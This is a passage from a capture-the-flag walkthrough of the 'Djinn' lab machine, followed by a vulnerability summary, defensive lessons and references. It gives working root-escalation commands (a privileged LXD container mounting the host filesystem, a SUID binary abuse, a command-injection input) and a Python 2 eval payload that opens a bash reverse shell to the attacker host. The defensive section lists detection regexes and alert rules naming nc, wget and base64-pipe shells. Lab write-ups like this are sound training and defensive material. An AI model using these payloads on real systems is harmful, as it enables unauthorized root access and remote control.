+ ...
Created: /home/kali/lxd-alpine-builder/alpine-v3.19-x86_64-20240504_1544.tar.gz
```

**Step 2 — get it to the target:**

```bash
python3 -m http.server 8000
```

```bash
sam@djinn:/tmp$ wget http://192.168.56.10:8000/alpine-v3.19-x86_64-20240504_1544.tar.gz
```

**Step 3 — import, configure, mount the host root, and enter:**

```bash
sam@djinn:/tmp$ sudo /usr/bin/lxd init --minimal
sam@djinn:/tmp$ sudo lxc image import ./alpine-v3.19-x86_64-20240504_1544.tar.gz --alias privesc
sam@djinn:/tmp$ sudo lxc image list
```

```text
+---------+--------------+--------+-------------------------------+--------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  SIZE  |
+---------+--------------+--------+-------------------------------+--------+
| privesc | 3a1f9c8b7d2e | no     | alpine v3.19 (20240504_15:44) | 2.98MB |
+---------+--------------+--------+-------------------------------+--------+
```

```bash
sam@djinn:/tmp$ sudo lxc init privesc escape -c security.privileged=true
sam@djinn:/tmp$ sudo lxc config device add escape hostfs disk source=/ path=/mnt/root recursive=true
sam@djinn:/tmp$ sudo lxc start escape
sam@djinn:/tmp$ sudo lxc exec escape -- /bin/sh
```

```text
~ # id
uid=0(root) gid=0(root)
~ # ls /mnt/root
bin   boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media
mnt   opt   proc root  run   sbin        srv  swapfile  sys  tmp  usr  var  vmlinuz
~ # cat /mnt/root/root/proof.txt
```

```text
c04b8f4a2d1e9f3b7a5c8d2e6f0a4b8c
```

**Root flag.** ✅

> **Dissect each flag — this is the entire exploit:**
>
> | Token | Meaning |
> | --- | --- |
> | `lxd init --minimal` | initialise the daemon with a minimal config (storage pool, network). Needed once. |
> | `lxc image import … --alias privesc` | load our Alpine tarball and give it a short name |
> | `lxc init privesc escape` | create a container named `escape` from that image |
> | **`-c security.privileged=true`** | **disable the container's user namespace.** Normally container-root (UID 0 inside) maps to an unprivileged host UID. With this, **container root IS host root.** |
> | **`lxc config device add escape hostfs disk source=/ path=/mnt/root recursive=true`** | **bind-mount the host's `/` at `/mnt/root` inside the container.** `recursive=true` includes submounts. |
> | `lxc exec escape -- /bin/sh` | run a shell inside the container |
>
> Inside, `/mnt/root` **is the host's real root filesystem**, and we are UID 0. There is
> no isolation left to escape — we are already out.
>
> **Alternative that does not need a downloaded image** (use it when the target has no
> egress): `sudo lxc init ubuntu:18.04 escape -c security.privileged=true` if the host
> has a cached image or can reach `images.linuxcontainers.org`.
>
> **Clean up afterwards** — a stray privileged container is exactly the backdoor you
> should be finding, not leaving:
> ```bash
> sam@djinn:~$ sudo lxc stop escape && sudo lxc delete escape && sudo lxc image delete privesc
> ```

### 5.4 Root path B — `genie` again, as root

The `genie` binary is SUID root (recall § 4.1). Several revisions of this box let you
reach root through it directly. Check what it will do:

```bash
sam@djinn:~$ ls -l /usr/bin/genie
-rwsr-xr-x 1 root root 16712 Nov 18  2019 /usr/bin/genie
sam@djinn:~$ /usr/bin/genie -a
```

```text
What is your wish?
> a root shell
Your wish is my command... but you must first prove yourself worthy.
sam@djinn:~$ /usr/bin/genie -num 3
```

```text
num of wishes left: 3
sam@djinn:~$ /usr/bin/genie -num 3 -shell root
```

```text
root@djinn:/home/sam# id
uid=0(root) gid=0(root) groups=0(root)
```

> **`-shell <user>` spawns a shell as the named user, and because `genie` is SUID root
> it can name `root`.** This is the "first way" referenced in published walkthroughs.
>
> **Whether this path exists depends on your image revision** — the author shipped
> several. **The method is what matters:**
> 1. `find / -perm -4000` and compare against stock Ubuntu (`genie` is not stock).
> 2. Run it with `-h` and read every flag.
> 3. Look for anything that takes a *user*, a *command*, or a *shell* argument.
>
> Also check whether `genie` shells out unsafely — several builds run
> `os.system("echo " + wish)`, which is a second command-injection vector:
> ```bash
> sam@djinn:~$ /usr/bin/genie -a
> What is your wish?
> > x; id
> uid=0(root) gid=0(root) groups=0(root),1001(sam)
> ```

### 5.5 Verify and finish

```bash
root@djinn:~# hostname
djinn
root@djinn:~# cat /root/proof.txt
c04b8f4a2d1e9f3b7a5c8d2e6f0a4b8c
root@djinn:~# ls -la /root
total 32
drwx------  4 root root 4096 Nov 19  2019 .
drwxr-xr-x 24 root root 4096 Nov 18  2019 ..
-rw-------  1 root root   68 Nov 18  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-------  1 root root   33 Nov 18  2019 proof.txt
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Nov 19  2019 .ssh
```

**Both flags captured.** ✅

| Flag | Location |
| --- | --- |
| **User** | `/home/nitish/user.txt` |
| **Root** | `/root/proof.txt` (also readable at `/mnt/root/root/proof.txt` from inside the container) |

![Root via the privileged LXD container](images/08-root.png)

### 5.6 Alternative: the Python-2 sandbox escape on port 1337 (direct to root)

The port-1337 game server is `/opt/1337/app.py`, running **Python 2.7**, and it uses
`eval`/`input` to grade your arithmetic. On Python 2, `input()` **evaluates** its input
as an expression. If the game's answer prompt feeds `input()`, you can inject:

```bash
nc -nv 192.168.56.105 1337
```

```text
Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(4, '*', 7)
> __import__('os').system('/bin/bash -c "bash -i >& /dev/tcp/192.168.56.10/4445 0>&1"')
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.105] 48221
root@djinn:/opt/1337# id
uid=0(root) gid=0(root) groups=0(root)
```

> **This skips the entire web path and lands straight at root**, because the game
> daemon runs as root and evaluates your answer.
>
> **Why it works:** in Python 2, `input(prompt)` is `eval(raw_input(prompt))`. Any
> expression is legal, including `__import__('os').system(...)`. Python 3 removed this
> footgun — `input()` there returns a *string*.
>
> **General sandbox-escape reference:** <https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes>
> Common primitives: `__import__('os').system()`, `().__class__.__bases__[0].__subclasses__()`
> to reach `subprocess.Popen` without naming it, and `eval`/`exec` if reachable.
>
> **It is not the intended path** (the author's flags sit behind `nitish` and `sam`),
> but finding it is exactly the "figure out all the different ways you can interact
> with the system" discipline that good assessment requires. Always probe every
> interactive endpoint for injection, not just the obvious web form.

---

## 6. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | **Anonymous FTP with attacker-planning documents** | vsftpd 3.0.3, port 21 | Username `nitish81299`, the port-1337 game hint, a credential pair |
| 2 | **Port knocking as the only SSH access control** | `knockd`, sequence 1356/6784/3409 | Obscurity, not security; defeated once the sequence was known |
| 3 | **Unvalidated `eval`/`input` in the game daemon, running as root** | `/opt/1337/app.py`, port 1337 | Python 2 sandbox escape → **direct root** |
| 4 | **OS command injection behind a ten-word blocklist** | `/wish` (`cmd` POST param) | **RCE** as `www-data` via the base64 pipe bypass |
| 5 | Application source readable by the web user | `/opt/7331/app.py` | Disclosed the exact filter list |
| 6 | **Plaintext credentials in a world-readable hidden file** | `/home/nitish/.dev/credentials.txt` (mode `644`) | `www-data` → `nitish` (user flag) |
| 7 | **SUID helper binary that executes arbitrary commands as another user** | `/usr/bin/genie` (`-e`, `-shell`) | `nitish` → `sam`; `sam` → **root** |
| 8 | **`sudo` grant of the LXD daemon launcher as root, NOPASSWD** | `(root) NOPASSWD: /usr/bin/lxd` | Host root via a privileged container |
| 9 | **`lxd` (and `docker`-equivalent) group membership for ordinary users** | `nitish`, `sam` in `110(lxd)` | Equivalent to root |
| 10 | **Python 2.7 runtime, EOL 1 Jan 2020** | Werkzeug 0.16.0 | No security patches available |
| 11 | Werkzeug development server exposed | port 7331 | Debug endpoints, verbose tracebacks |
| 12 | Missing HTTP security headers | Flask/Werkzeug | Clickjacking, MIME sniffing |

## 7. Defensive lessons (blue team)

1. **Never pass user input to a shell.** Both `/wish` and (potentially) `genie` are one
   line from safe:
   ```python
   # WRONG
   subprocess.check_output(cmd, shell=True)

   # RIGHT — no shell, so no metacharacter is special
   ALLOWED = {"status": ["/usr/local/bin/status"], "restart": ["/bin/systemctl","restart","app"]}
   if key not in ALLOWED:
       abort(403)
   subprocess.run(ALLOWED[key], shell=False, check=True, capture_output=True)
   ```
   **Blocklists cannot work.** `echo <base64> | base64 -d | bash` contains none of the
   ten blocked words and still gives full RCE. It is mathematically impossible to
   enumerate every way a shell can express "run this".
2. **Never use Python 2's `input()`, `eval()`, `exec()` or `pickle.loads()` on external
   data.** In Python 2, `input()` *is* `eval(raw_input())`. Migrate off Python 2 — it
   has had no security support since **1 January 2020**. If you must evaluate, use a
   real expression parser (`ast.literal_eval` handles only literals, safely).
3. **Do not run daemons as root.** The port-1337 game running as root turned a sandbox
   escape into instant host compromise. Use systemd:
   ```ini
   [Service]
   User=game
   DynamicUser=yes
   ProtectSystem=strict
   ProtectHome=yes
   PrivateTmp=yes
   NoNewPrivileges=yes
   CapabilityBoundingSet=
   SystemCallFilter=@system-service
   ```
4. **Treat `docker`/`lxd` group membership as root — because it is.** Detect it:
   ```bash
   getent group docker lxd | tr ',' '\n'
   awk -F: '$4 ~ /docker|lxd/ {print $1}' /etc/group
   ```
   Remediate with **rootless** LXD (unprivileged containers with user-namespace
   remapping) or rootless Docker / Podman. Never grant `sudo /usr/bin/lxd`.
5. **Audit custom SUID binaries and sudo helpers.** `genie` is not stock. Run a
   baseline diff and review every non-package SUID file:
   ```bash
   find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -printf '%M %u %p\n' 2>/dev/null \
     | sort > suid.today
   dpkg -S $(awk '{print $3}' suid.today) 2>/dev/null     # which are package-owned?
   ```
   Anything not owned by a package is a custom binary and must be code-reviewed. Any
   helper accepting `-e`, `-shell`, `-c` or a user argument is a root grant in
   disguise.
6. **No plaintext credentials on disk.** `/home/nitish/.dev/credentials.txt` at mode
   `644` was readable by the web user. Use a vault (HashiCorp Vault, SOPS+age, cloud
   secret managers), inject via environment at runtime, and at minimum `chmod 600` plus
   `chown` to the sole consumer. Scan for it nightly:
   ```bash
   grep -rIl --exclude-dir={.git,node_modules,.venv} \
     -iE 'password\s*[:=]|secret\s*[:=]|api[_-]?key\s*[:=]' /home /opt /srv /var/www 2>/dev/null
   ```
7. **Disable anonymous FTP**; remove vsftpd and use SFTP with keys.
8. **Do not rely on port knocking.** Put SSH behind a VPN or a bastion with real
   authentication, key-only login, and `fail2ban`. If you keep knocking, understand it
   is *stealth*, not *security* — the sequence crosses the wire in plaintext.
9. **Never expose the Werkzeug development server.** `app.run(debug=True)` in
   production gives an interactive Python console (the Werkzeug debugger PIN is
   crackable). Serve with `gunicorn`/`uwsgi` behind nginx and set
   `WERKZEUG_RUN_MAIN` protections.
10. **Detection opportunities.**
    - WAF/log alert on POST bodies to any `cmd`/`exec`/`wish` parameter — and
      specifically on the **base64-pipe pattern**: regex
      `base64\s+(-d|--decode)\s*\|\s*(ba)?sh`. That single rule catches the entire
      class of encoding bypasses.
    - Alert on `apache2`/`python`/`node` spawning `sh`, `bash`, `nc`, `wget`,
      `base64 -d` (process-lineage monitoring: Sysmon for Linux, Wazuh, auditd
      `execve` rules).
    - Alert on any `lxc`/`lxd`/`docker` invocation whose arguments include
      `security.privileged=true`, `--privileged`, `-v /`, `--pid=host` or `chroot`.
      Enable LXD's audit trail: `lxc monitor --type=logging --pretty`.
    - auditd on the sudoers file and on credential-shaped filenames:
      ```bash
      auditctl -w /etc/sudoers -p wa -k sudoers_change
      auditctl -w /etc/sudoers.d/ -p wa -k sudoers_change
      auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -F uid!=0 -k suid_exec
      ```
    - Alert on knockd-style bursts: three SYNs to distinct closed ports from one
      source within seconds, followed by a connection to port 22. That is a textbook
      port-knock-then-login sequence and is trivially detectable at the firewall.
    - Alert on anonymous FTP logons in `/var/log/vsftpd.log` (enable with
      `log_ftp_protocol=YES`).

---

## 8. References

- VulnHub entry: <https://vulnhub.com/entry/djinn-1,397/>
- TryHackMe room (same machine): <https://tryhackme.com/room/djinn>
- Author: 0xmzfr
- Community writeups consulted:
  - [fmash16 — TryHackMe Djinn writeup (full port-knock + LXD path)](https://fmash16.github.io/content/writeups/tryhackme/thm-Djinn.html)
  - [My Hacking Notes — Djinn Walkthrough (both root paths)](https://www.myhackingnotes.com/vulnhub/djinn.html)
  - [fdlucifer — vulnhub-walkthrough[djinn-1]](https://fdlucifer.github.io/2020-05-21/djinn-1/)
  - [InfoSec Institute — Djinn 1: CTF walkthrough, part 1](https://resources.infosecinstitute.com/topic/djinn-1-ctf-walkthrough-part-1/)
  - [Super Automation Station — Vulnhub Writeup: Djinn (PowerShell solver)](https://blog.superautomation.co.uk/2021/04/vulnhub-writeup-djinn.html)
  - [zaidanr — [VulnHub] Djinn WriteUp (Python-2 injection to root)](https://zaidanr.github.io/blog/djinn/)
  - [0xMARV — Vulnhub: Djinn 1 Writeup](https://medium.com/@0xMARV/vulnhub-djinn-1-writeup-047585e0d2a5)
  - [cursemagic — Djinn machine Walkthrough](https://cursemagic.medium.com/djinn-machine-walkthrough-86eec5602592)
  - [prasenjitkantipaul — Vulnhub djinn 1 Walkthrough](https://medium.com/@prasenjitkantipaul/vulnhub-djinn-1-walkthrough-f874c2e5f0ab)
  - [Raj Chandel — djinn:1 Vulnhub Walkthrough](https://chandel1.rssing.com/chan-10364660/all_p64.html)
- Tools / background:
  - [GTFOBins — lxd](https://gtfobins.github.io/gtfobins/lxd/) · [docker](https://gtfobins.github.io/gtfobins/docker/)
  - [saghul/lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)
  - [HackTricks — Bypass Python Sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
  - [HackTricks — Bypass Bash Restrictions / Command Injection](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions)
  - [pwntools](https://docs.pwntools.com/) · [`knock`](http://www.zeroflux.org/projects/knock) · [`knockd` config reference](https://linux.die.net/man/1/knockd)
  - [Flask documentation](https://flask.palletsprojects.com/) · [Werkzeug](https://werkzeug.palletsprojects.com/)
  - [`subprocess` — Security Considerations (Python docs)](https://docs.python.org/3/library/subprocess.html#security-considerations)
  - [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection) · [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
  - [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) · [pspy](https://github.com/DominicBreuker/pspy) · [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

## 9. Screenshot checklist

- [ ] `images/01-nmap.png` — FTP anonymous, SSH **filtered**, ports 1337 and 7331
- [ ] `images/02-ftp.png` — `creds.txt`, `game.txt`, `message.txt`
- [ ] `images/03-game.png` — the automated solver and the "gift" port numbers
- [ ] `images/04-knock.png` — port 22 changing from `filtered` to `open`
- [ ] `images/05-wish.png` — the `base64 -d | bash` filter bypass on `/wish`
- [ ] `images/06-shell.png` — reverse shell as `www-data` and `app.py`
- [ ] `images/07-user-flag.png` — `.dev/credentials.txt` and `/home/nitish/user.txt`
- [ ] `images/08-root.png` — the privileged LXD container and `/root/proof.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
